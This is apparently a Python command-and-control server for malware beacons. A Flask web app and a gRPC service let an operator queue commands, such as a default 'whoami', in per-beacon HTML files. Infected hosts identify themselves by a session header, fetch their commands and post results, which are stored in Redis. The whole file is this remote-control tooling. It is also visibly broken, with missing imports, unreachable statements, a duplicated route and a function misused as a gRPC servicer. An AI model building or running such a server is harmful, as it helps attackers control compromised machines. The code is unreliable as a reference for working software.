from flask import *
import grpc
from concurrent import futures
import time
import protobuff_pb2_grpc as pb2_grpc
import protobuff_pb2 as pb2
import redis

conn = redis.Redis('localhost')
app = Flask(__name__)

def GetServerResponse(request, context):

    # We need an ID (ID for beacon) and message (What to tell the beacon)
    message = request.message
    ID = request.bID
    opt = request.opt
    if set(ID).difference(ascii_letters + digits + '-'):
        # We're not going to bother with input sanitization here
        # If we receive special characters just drop it entirely
        pass
    else:
        if opt == 'SC':
            # If option is to set command, then write it to the file
            f = open(f"/var/www/html/{ID}.html", "a")
            f.write(message)
            f.close()
            result = f'Received command, wrote {message} to file {ID}'
            result = {'message': result, 'received': True}
            return pb2.MessageResponse(**result)
        elif opt == 'GR':
            # If option is to get the returned results of a beacon, page the SQL? DB for the results
            result = f'Getting status of beacon {ID}'
            result = {'message': conn.hgetall(ID), 'received': True}
            return pb2.MessageResponse(**result)

@app.route("/")
def home():
    # Grab the appsessionid value from the headers
    val = request.headers['APPSESSIONID']
    if set(val).difference(ascii_letters + digits + '-'):
        # We're not going to bother with input sanitization here
        # If we receive special characters just drop it entirely
        pass
    else:
        message = b"cmd;whoami;null "
        print(f'headers:{val}')
        # create a new page for the UUID we got from the headers
        f = open(f"/var/www/html/{val}.html", "a")
        f.write(message)
        f.close()
        return ('')

@app.route('/<path:filename>', methods=['GET', 'POST'])
def index(filename):
    if request.method == 'GET':
        val = {request.headers['APPSESSIONID']}
        stats = f'Host {val} grabbed command'
        return send_from_directory('.', filename)
        bacon = {"bID": val, "Got command": "X"}
        conn.hmset("pythonDict", bacon)

    return jsonify(request.data)

@app.route("/<path:filename>", methods=['POST'])
def results():
    if request.method == 'POST':
        val = {request.headers['APPSESSIONID']}
        print(f'Result: {request.data} from beacon: {val}')
        response = request.data
        bacon = {"bID": val, "Returned data": response}
        conn.hmset("pythonDict", bacon)
        return 'HELO'

def serve():
    server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))
    pb2_grpc.add_UnaryServicer_to_server(GetServerResponse(), server)
    server.add_insecure_port('[::]:50051')
    server.start()
    app.run(debug=True)
    server.wait_for_termination()

if __name__ == "__main__":
    serve()
